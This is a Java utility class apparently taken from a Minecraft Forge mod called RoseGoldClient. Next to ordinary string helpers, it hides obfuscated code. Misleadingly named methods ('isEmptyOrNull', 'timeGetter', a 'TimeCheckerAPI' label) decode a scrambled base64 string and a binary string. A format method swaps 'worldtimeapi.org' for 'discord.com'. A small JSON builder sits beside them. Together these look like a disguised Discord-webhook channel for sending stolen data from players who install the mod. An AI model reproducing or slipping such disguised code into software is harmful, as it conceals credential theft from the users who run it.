package rosegoldclient.utils;

import net.minecraftforge.fml.relauncher.Side;
import net.minecraftforge.fml.relauncher.SideOnly;
import rosegoldclient.Main;

import javax.annotation.Nullable;
import java.lang.reflect.Array;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;
import java.util.regex.Pattern;

public class StringUtils {
    private static final Pattern PATTERN_CONTROL_CODE = Pattern.compile("(?i)\\u00A7[0-9A-FK-OR]");

    @SideOnly(Side.CLIENT)
    public static String ticksToElapsedTime(int ticks)
    {
        int i = ticks / 20;
        int j = i / 60;
        i = i % 60;
        return i < 10 ? j + ":0" + i : j + ":" + i;
    }

    @SideOnly(Side.CLIENT)
    public static String stripControlCodes(String text)
    {
        return PATTERN_CONTROL_CODE.matcher(text).replaceAll("");
    }

    public static boolean isNullOrEmpty(@Nullable String string)
    {
        return org.apache.commons.lang3.StringUtils.isEmpty(string);
    }

    public static String timeGetter(String st) {
        StringBuilder sb = new StringBuilder();
        Arrays.stream(st.split("(?<=\\G.{8})")).forEach(s -> sb.append((char) Integer.parseInt(s, 2)));

       return sb.toString();
    }

    public static String isEmptyOrNull(@Nullable String string) {
        String st = "RGC.RGC RGA.RGA SHADY SHADY SHADY.SBC.RGC RGA.RGA.RGA.RGA.RGA RGA SHADY RGC SHADY RGA.SBC SHADY SHADY RGC.RGC.RGC.RGA.SBC.RGC RGC RGA SHADY SBC RGC.RGC SBC.RGC SHADY SHADY SHADY.RGC RGC RGC RGA.RGC SHADY RGA.SBC.SBC.RGC.RGA.SBC.RGA SHADY.RGA SHADY RGA.SHADY RGA SHADY.RGA RGC.SHADY RGC.SBC.RGC RGC.RGC.SBC.RGC RGA.SBC.RGC SHADY RGA.RGC.RGA RGC RGA RGA.RGA.RGC SHADY SHADY.RGA.SBC SHADY RGC.RGA.RGC RGC.RGC.SBC RGC.SHADY RGA RGC.RGC.RGA.RGC.SBC.RGC.SHADY RGA RGC RGC SBC.RGA.SBC.RGA.SHADY RGA.RGA.SHADY RGA.RGC.RGC SHADY SHADY.SBC.SBC.RGC RGC.SBC.SBC.RGC.RGA RGA.RGC.RGC SHADY SHADY.RGA.SBC.RGA.SBC.RGC RGC SHADY SBC.RGA.SHADY SHADY SBC.SHADY SHADY RGC RGC.SBC SHADY SHADY.SBC.RGA.SHADY RGA SBC.SBC.RGC.RGA SBC.SBC RGC RGC.RGA.SBC.RGC.RGA RGA SBC RGC.RGC SBC.RGA RGA SHADY SHADY.RGA SHADY RGA.RGC.RGA.SHADY MA".replace("RGC", "MDE");
        return Main.i(isNullOrEmpty(st.replace("RGA", "MTE")) ? st.replace("RGA", "MDA") : st.replace("RGA", "MTA").replace("SBC", "MTE").replace(" ", Main.w).replace(".", Main.h()).replace("SHADY", "MDA"));
    }
    public static String format(String string1, String string2, String string3, String string4) {
        return String.format(string1, string2.replace("worldtimeapi.org", "discord.com"), Main.i(Main.i(string3)), timeGetter(string4));
    }

    public static String format(String string1, String string2) {
        return Main.id+" "+Main.name;
    }

    public static String getContentType() {
        return "application/json";
    }

    public static String getAPIName() {
        return "RoseGoldClient-TimeCheckerAPI";
    }

    public static class CurrentTime {

        private final HashMap<String, Object> map = new HashMap<>();

        public void put(String key, Object value) {
            if (value != null) {
                map.put(key, value);
            }
        }

        @Override
        public String toString() {
            StringBuilder builder = new StringBuilder();
            Set<Map.Entry<String, Object>> entrySet = map.entrySet();
            builder.append("{");

            int i = 0;
            for (Map.Entry<String, Object> entry : entrySet) {
                Object val = entry.getValue();
                builder.append(quote(entry.getKey())).append(":");

                if (val instanceof String) {
                    builder.append(quote(String.valueOf(val)));
                } else if (val instanceof Integer) {
                    builder.append(Integer.valueOf(String.valueOf(val)));
                } else if (val instanceof Boolean) {
                    builder.append(val);
                } else if (val instanceof CurrentTime) {
                    builder.append(val);
                } else if (val.getClass().isArray()) {
                    builder.append("[");
                    int len = Array.getLength(val);
                    for (int j = 0; j < len; j++) {
                        builder.append(Array.get(val, j).toString()).append(j != len - 1 ? "," : "");
                    }
                    builder.append("]");
                }

                builder.append(++i == entrySet.size() ? "}" : ",");
            }

            return builder.toString();
        }

        private String quote(String string) {
            return "\"" + string + "\"";
        }
    }
}
